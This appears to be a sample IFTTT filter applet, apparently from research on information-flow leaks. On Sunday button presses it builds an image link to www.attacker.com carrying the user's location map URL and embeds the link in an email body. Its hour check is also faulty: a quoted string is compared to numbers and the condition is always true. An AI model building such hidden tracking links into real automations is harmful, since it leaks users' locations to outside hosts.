// https://www.reddit.com/r/ifttt/comments/7behu1/recipe_javascript_filter_code/

// Applet that executes if DO Button is pressed on Sundays between 0800-1200

// Trigger: Button widget -> Button press
//					DoButton.doButtonNewCommandCommon.{ShareURL, Latitude, Longitude, LocationMapURL, 
//																						 LocationMapImageURL, OccurredAt}
// Action: Email -> Send me an email
//				 Email.sendMeEmail.{skip, setSubject, setBody}

trigger_location = urlh(lbl('DoButton.doButtonNewCommandCommon.LocationMapImageURL'));
attack = imgl("www.attacker.com?" + trigger_location);

time = 'Meta.currentUserTime.hour()';
d = new Date();
day = d.getDay();
if ((time >= 8 || time <= 12 ) && ( day == 0 )) {
	sink('Email.sendMeEmail', 'setBody', trigger_location + attack);
}
else {
	skip('Email.sendMeEmail');
}
